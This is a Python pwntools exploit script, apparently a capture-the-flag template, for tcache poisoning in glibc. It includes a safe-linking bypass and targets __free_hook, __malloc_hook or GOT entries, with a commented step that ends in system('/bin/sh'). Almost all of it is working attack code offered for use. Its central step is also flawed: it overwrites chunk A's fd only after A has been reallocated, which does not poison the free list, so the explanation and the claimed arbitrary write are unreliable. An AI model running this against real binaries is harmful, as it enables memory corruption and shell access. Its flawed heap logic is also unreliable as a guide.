#!/usr/bin/env python3
"""
tcache poison

Tcache bin poisoning for glibc ≥2.27.
Includes safe-linking bypass for glibc ≥2.32.

attack flow:
    1. Allocate chunks A, B
    2. Free B, Free A (tcache: A → B)
    3. Allocate (get A), overwrite A's fd → target
    4. Allocate (get B)
    5. Allocate → get chunk at target → arbitrary write!

glibc ≥2.32 safe-linking:
    fd_stored = (chunk_addr >> 12) ^ real_fd
    To poison: new_fd = (chunk_addr >> 12) ^ target
"""
from pwn import *
import sys

BINARY = './chall'
LIBC   = ''
HOST   = '127.0.0.1'
PORT   = 1337

context.arch = 'amd64'
context.log_level = 'info'

elf  = ELF(BINARY) if os.path.exists(BINARY) else None
libc = ELF(LIBC) if LIBC and os.path.exists(LIBC) else None

def conn():
    if 'local' in sys.argv:
        return process(BINARY)
    return remote(HOST, PORT)


def alloc(p, size, data=b'A'):
    """Allocate a chunk. Adjust for your challenge menu."""
    p.sendlineafter(b'> ', b'1')          # menu choice
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendlineafter(b'data: ', data)

def free(p, idx):
    """Free a chunk by index."""
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def edit(p, idx, data):
    """Edit chunk content (if available)."""
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'data: ', data)

def show(p, idx):
    """Show/print chunk content (for leaks)."""
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline()


def protect(pos, ptr):
    """Encode a fd pointer with safe-linking: (pos >> 12) ^ ptr"""
    return (pos >> 12) ^ ptr

def deprotect(val):
    """Decode a safe-linked fd pointer (known heap base)."""
    # For leak: we know the stored fd = (chunk_addr >> 12) ^ real_fd
    # If real_fd = 0 (end of list): stored = chunk_addr >> 12
    # So heap_base ≈ stored << 12
    bits = 64
    key = 0
    for i in range(1, (bits // 4) + 1):
        r = val >> (bits - 4 * i)
        key ^= r
        val ^= key << (bits - 4 * (i + 1)) if i < (bits // 4) else 0
    return val


SAFE_LINKING = False   # Set True for glibc ≥2.32


def exploit():
    p = conn()

    SIZE = 0x20   # tcache chunk size (pick appropriate bin)

    
    alloc(p, SIZE, b'AAAA')  # idx 0 = chunk A
    alloc(p, SIZE, b'BBBB')  # idx 1 = chunk B
    alloc(p, SIZE, b'CCCC')  # idx 2 = chunk C (guard against consolidation)

    
    free(p, 1)   # free B
    free(p, 0)   # free A → tcache[SIZE]: A → B

    
    # After free, chunk A's fd = address of B (or safe-linked)
    # If show() works on freed chunks:
    # leak = show(p, 0)
    # heap_leak = u64(leak[:8])
    # if SAFE_LINKING:
    #     heap_leak = deprotect(heap_leak)
    # log.success(f'heap leak = {hex(heap_leak)}')

    
    target = 0x0   # WHERE you want to allocate (e.g., __free_hook, __malloc_hook, GOT)

    # Examples:
    # target = libc.sym['__free_hook']     # glibc <2.34
    # target = libc.sym['__malloc_hook']   # glibc <2.34
    # target = elf.got['exit']             # GOT overwrite
    # target = libc.address + 0x21a000     # _IO_list_all (House of Spirit)

    if SAFE_LINKING:
        # Chunk A's address (need heap base leak)
        chunk_a_addr = 0x0  # FILL with leaked address
        poisoned_fd = protect(chunk_a_addr, target)
    else:
        poisoned_fd = target

    # Allocate from tcache → get chunk A → overwrite fd
    alloc(p, SIZE, p64(poisoned_fd))  # idx 3 = was chunk A, overwrote fd → target

    
    alloc(p, SIZE, b'JUNK')          # idx 4 = was chunk B (consume B)
    alloc(p, SIZE, p64(0xdeadbeef))  # idx 5 = chunk at TARGET! ← arbitrary write!

    
    # If target was __free_hook: wrote system addr, now free a chunk containing "/bin/sh"
    # alloc(p, SIZE, b'/bin/sh\x00')  # idx 6
    # free(p, 6)                      # __free_hook(chunk) = system("/bin/sh")

    p.interactive()

if __name__ == '__main__':
    exploit()
